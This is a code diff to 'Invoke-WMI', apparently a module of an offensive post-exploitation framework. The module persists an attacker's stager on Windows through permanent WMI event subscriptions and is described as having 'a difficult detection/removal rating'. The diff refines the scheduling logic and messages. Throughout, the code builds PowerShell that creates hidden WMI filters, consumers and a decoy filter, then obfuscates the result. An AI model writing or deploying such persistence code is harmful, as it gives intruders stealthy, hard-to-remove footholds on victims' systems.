@@ -12,7 +12,7 @@ class Module(object):
         self.info = {
             'Name': 'Invoke-WMI',
 
-            'Author': ['@mattifestation', '@harmj0y', '@jbooz1'],
+            'Author': ['@mattifestation', '@harmj0y', '@jbooz1', '@janit0rjoe'],
 
             'Description': ('Persist a stager (or script) using a permanent WMI subscription. This has a difficult detection/removal rating.'),
 
@@ -57,12 +57,12 @@ class Module(object):
                 'Value': ''
             },
             'Day': {
-                'Description': 'Day of month to trigger the script (1-31). Default DailyTime 09:00.',
+                'Description': 'Day of month to trigger the script (1-31). Optional to DailyTime.',
                 'Required': False,
                 'Value': ''
             },
             'DayOfWeek': {
-                'Description': 'Day of week to trigger the script (0-6). Default DailyTime 09:00.',
+                'Description': 'Day of week to trigger the script (0-6). Optional to DailyTime.',
                 'Required': False,
                 'Value': ''
             },
@@ -142,17 +142,16 @@ class Module(object):
 
         statusMsg = ""
         locationString = ""
-        dayFilter = ""
 
         if cleanup.lower() == 'true':
-            # commands to remove the WMI filter and subscription
+            # commands to remove the WMI filter and subscription - also remove the dummy WMI filter
             script = "Get-WmiObject __eventFilter -namespace root\subscription -filter \"name='" + subName + "'\"| Remove-WmiObject;"
             script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='" + subName + "'\" | Remove-WmiObject;"
             script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '" + subName + "'} | Remove-WmiObject;"
             script += "Get-WmiObject __eventFilter -namespace root\subscription -filter \"name='" + dummySubName + "'\"| Remove-WmiObject;"
             script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='" + dummySubName + "'\" | Remove-WmiObject;"
             script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '" + dummySubName + "'} | Remove-WmiObject;"
-            script += "'WMI persistence with subscription named " + subName + "(" + dummySubName + ") removed.'"
+            script += "'WMI persistence with subscription named " + subName + " removed.'"
             script = helpers.keyword_obfuscation(script)
             if obfuscate:
                 script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
@@ -217,36 +216,45 @@ class Module(object):
 
         elif (dailyTime != '' or day != '' or dayOfWeek != ''):
 
-            if (day != '' and dayOfWeek != ''):
-                # if those day and dayOfWeek are combined, return nothing for the script
+            # add DailyTime to event filter
+            parts = dailyTime.split(":")
+
+            if len(parts) < 2:
                 print()
-                helpers.color("[!] Can not combine day and dayOfWeek")
+                helpers.color("[!] Please use HH:mm format for DailyTime")
                 return ""
 
-            # add DailyTime or default DailyTime to event filter
-            if dailyTime != '':
-                parts = dailyTime.split(":")
+            hour = parts[0]
+            minutes = parts[1]
 
-                if len(parts) < 2:
-                    print()
-                    helpers.color("[!] Please use HH:mm format for DailyTime")
-                    return ""
+            # some presets for building status message and the script
+            statusMsgDay = " daily"
+            dayFilter = ""
+            script = ""
 
-                hour = parts[0]
-                minutes = parts[1]
-            else:
-                hour = "09"
-                minutes = "00"
-
-            script = ""              
+            # if those day and dayOfWeek are combined, return nothing for the script
+            if (day != '' and dayOfWeek != ''):
+                print()
+                helpers.color("[!] Can not combine Day and DayOfWeek")
+                return ""
 
             # add day or dayOfWeek to event filter
             if day != '':
+                if (int(day) < 1) or (int(day) > 31):
+                    print()
+                    helpers.color("[!] Please stick to range 1-31 for Day")
+                    return ""
                 dayFilter = " AND TargetInstance.Day = " + day
+                statusMsgDay = " every day of month: " + day + " (1-31)"
+
             elif dayOfWeek != '':
-                # using or as workaround for broken win32_localtime ()
+                if (int(dayOfWeek) < 0) or (int(dayOfWeek) > 6):
+                    print()
+                    helpers.color("[!] Please stick to range 0-6 for DayOfWeek")
+                    return ""
                 dayFilter = " AND TargetInstance.DayOfWeek=" + dayOfWeek
-                # creating and bind a dummy WMI event filter with a "nop event consumer" as workaround for win32_localtime.DayOfWeek bug.
+                statusMsgDay = " every day of week: " + dayOfWeek + " (0-6)"
+                # creating and bind a dummy WMI event filter with a "nop event consumer" as workaround for win32_localtime.DayOfWeek bug
                 dayFilterDummy = " AND (TargetInstance.DayOfWeek=" + dayOfWeek +" OR TargetInstance.DayOfWeek=" + str((int(dayOfWeek)+1)%7) + ")"
                 script += "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" + dummySubName + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'" + dayFilterDummy + " AND (TargetInstance.Hour = " + hour + ") AND (TargetInstance.Minute = " + minutes + ") GROUP WITHIN 60\"};"
                 script += "$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{ name='" + dummySubName + "';CommandLineTemplate=\"call\";RunInteractively='false'};"
@@ -254,8 +262,7 @@ class Module(object):
 
             # create the real WMI event filter for a system time
             script += "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" + subName + "';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'" + dayFilter + " AND (TargetInstance.Hour = " + hour + ") AND (TargetInstance.Minute = " + minutes + ") GROUP WITHIN 60\"};"
-            statusMsg += " WMI subscription daily trigger at " + dailyTime + "."
-            print(" ||| " + script + " |||")
+            statusMsg += " with WMI subscription trigger at " + dailyTime + statusMsgDay + "."
 
         else:
             # create the WMI event filter for OnStartup
